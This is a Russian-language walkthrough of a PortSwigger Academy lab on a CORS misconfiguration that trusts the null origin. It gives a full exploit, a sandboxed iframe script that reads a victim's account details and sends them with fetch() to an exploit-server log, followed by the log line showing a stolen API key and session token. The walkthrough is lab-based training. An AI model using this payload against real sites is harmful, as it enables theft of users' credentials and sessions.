залогинимся под `wiener:peter`

Откроем `Proxy` -> `HTTP history` и найдем запрос, ответ на который возвращает нам API ключ
```
GET /accountDetails 
```
и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin/pics%20for%20walkthrough/1.png)

добавим к запросу заголовок
```
Origin: null
```
и видим, что запрос проходит, и в ответе появляются два дополнительных Header'a
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin/pics%20for%20walkthrough/2.png)

Перейдем в `exploit server` и сформируем следующий скрипт

```
<html>
    <body>
        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
        <script>
            var xhr = new XMLHttpRequest();
            var url = 'https://0aa40050035f3464809d44fc000e002a.web-security-academy.net'

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    fetch('https://exploit-0acb00cd03bc348280e34382013100c7.exploit-server.net/log?key=' + xhr.responseText)
                }
            }

            xhr.open('GET', url + '/accountDetails', true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>"></iframe>
    </body>
</html>
```

Нажмем `Store` и `Deliver exploit to victim`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin/pics%20for%20walkthrough/3.png)

Далее перейдем в Access log и найдем следующую запись
```
10.0.3.52       2024-03-25 14:35:40 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22VBs6nlg360KcpYwzH1Pxxzv8tYO5II7w%22,%20%20%22sessions%22:%20[%20%20%20%20%22uCWT99SWaBTXlJavxWrumksZ9ke3QONJ%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
```

где видим api ключ 
```
VBs6nlg360KcpYwzH1Pxxzv8tYO5II7w
```
сдадим ключ в качестве ответа на задание и получим уведомление об успешно выполненной лабораторной работе

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/15.%20Cross-origin%20resource%20sharing%20(CORS)/2.%20CORS%20vulnerability%20with%20trusted%20null%20origin/pics%20for%20walkthrough/4.png)
